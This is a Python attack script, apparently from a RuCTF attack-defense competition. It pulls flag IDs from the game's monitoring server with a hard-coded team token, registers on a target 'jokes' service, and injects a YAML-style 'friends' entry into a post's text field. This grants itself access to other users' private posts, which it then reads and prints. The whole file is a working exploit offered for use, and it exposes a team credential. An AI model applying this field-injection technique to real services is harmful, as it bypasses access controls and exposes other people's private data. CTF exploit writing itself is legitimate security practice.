#!/usr/bin/env python3
import sys
import requests
import jwt
import random
import urllib.parse

host = sys.argv[1]

def get_id(host):
    headers = {
    'X-Team-Token': 'CLOUD_27_fccf28fc5ad2afc6eb2c33cdc9f9d0c5',
    }
    params = {
    'service': "4",
    }
    dataJson = requests.get('https://monitor.ructf.org/flag_ids', params=params, headers=headers).json()
    for i in range(1,36):
        if dataJson['flag_ids'][str(i)]['host'] == host:
            return dataJson['flag_ids'][str(i)]['flag_ids']

names = get_id(host)
host = sys.argv[1]

user = str(random.randint(1,10000000000000))

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': f'http://{host}:18888/',
    'Content-Type': 'multipart/form-data; boundary=---------------------------21019310117496933612305182916',
    'Origin': f'http://{host}:18888/',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

data = f'-----------------------------21019310117496933612305182916\r\nContent-Disposition: form-data; name="username"\r\n\r\n{user}\r\n-----------------------------21019310117496933612305182916\r\nContent-Disposition: form-data; name="password"\r\n\r\n{user}\r\n-----------------------------21019310117496933612305182916--\r\n'

response = requests.post(f'http://{host}:18888/api/register', headers=headers, data=data)

token = response.json()
token = token['token']



for name in names:
    user = name.split('+')[0]
    topic = urllib.parse.quote(name.split('+')[1], safe='')


    text = str(random.randint(1,10000000000000))

    data = f'-----------------------------385273196310911870624057872502\r\nContent-Disposition: form-data; name="theme"\r\n\r\n{text}\r\n-----------------------------385273196310911870624057872502\r\nContent-Disposition: form-data; name="status"\r\n\r\nprivate\r\n-----------------------------385273196310911870624057872502\r\nContent-Disposition: form-data; name="text"\r\n\r\n{text}"\r\nfriends:\r\n    {user}: "yes\r\n-----------------------------385273196310911870624057872502--'

    headers = {
	"Accept": "*/*",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.5",
	"Authorization": f"Bearer {token}",
	"Connection": "close",
	"Content-Length": str(len(data)),
	"Content-Type": "multipart/form-data; boundary=---------------------------385273196310911870624057872502",
	"Origin": f'http://{host}:18888/',
	"Referer": f'http://{host}:18888/',
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0"
    }

    response = requests.post(f'http://{host}:18888/api/jokes', data =  data, headers = headers)




    data = f"username={user}&theme={topic}"
    response = requests.get(f"http://{host}:18888/api/jokes", data = data, headers = {
	"Accept": "*/*",
	"Accept-Encoding": "gzip, deflate",
	"Accept-Language": "en-US,en;q=0.5",
	"Authorization": f"Bearer {token}",
	"Connection": "close",
	"Content-Length": str(len(data)),
	"Content-Type": "application/x-www-form-urlencoded",
	"Origin": f'http://{host}:18888/',
	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0"
    }, cookies = {})

    print(response.text, flush=True)


